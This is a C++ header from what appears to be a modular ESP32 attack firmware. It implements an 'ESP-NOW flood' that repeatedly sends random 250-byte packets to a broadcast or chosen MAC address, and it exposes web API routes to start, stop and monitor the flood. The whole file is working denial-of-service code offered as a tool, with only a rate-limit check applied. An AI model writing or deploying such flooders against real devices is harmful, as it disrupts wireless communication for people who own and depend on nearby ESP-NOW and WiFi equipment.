#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include "module.h"
#include "safety.h"

// ESP-NOW flood: blast ESP-NOW broadcast (or unicast) packets
// Works at the same layer as WiFi management; bypasses normal AP association
static bool en_running = false;
static volatile uint32_t en_sent = 0;
static TaskHandle_t en_task = nullptr;
static uint8_t en_target[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
static bool en_initialized = false;

static void en_run(void *) {
  uint8_t data[250];
  en_sent = 0;
  while (en_running) {
    if (!safety_rate_ok(2)) {
      vTaskDelay(pdMS_TO_TICKS(50));
      continue;
    }
    for (int i = 0; i < 250; i++)
      data[i] = esp_random() & 0xFF;
    esp_now_send(en_target, data, sizeof(data));
    en_sent++;
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  en_task = nullptr;
  vTaskDelete(nullptr);
}

static bool en_start(const String &q) {
  int i;
  String tgt;
  if ((i = q.indexOf("target=")) >= 0) {
    int e = q.indexOf('&', i);
    tgt = q.substring(i + 7, e < 0 ? q.length() : e);
  }
  if (tgt.length() == 17)
    sscanf(tgt.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&en_target[0], (unsigned *)&en_target[1],
           (unsigned *)&en_target[2], (unsigned *)&en_target[3], (unsigned *)&en_target[4],
           (unsigned *)&en_target[5]);
  else
    memset(en_target, 0xff, 6);
  if (!en_initialized) {
    if (esp_now_init() != ESP_OK)
      return false;
    en_initialized = true;
  }
  // Remove existing peer if present, then add with new target
  esp_now_del_peer(en_target);
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, en_target, 6);
  peer.channel = 0;
  peer.encrypt = false;
  esp_now_add_peer(&peer);
  en_running = true;
  en_sent = 0;
  xTaskCreate(en_run, "en_run", 3072, nullptr, 4, &en_task);
  return true;
}

static void en_stop() {
  en_running = false;
}

static void en_routes() {
  extern WebServer server;
  server.on("/api/espnow/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("espnow", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/espnow/stop", HTTP_POST, []() {
    tool_stop("espnow");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/espnow/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(en_running ? 1 : 0) + ",\"sent\":" + String(en_sent) +
                    ",\"msg\":\"sent " + String(en_sent) + "\"}");
  });
}
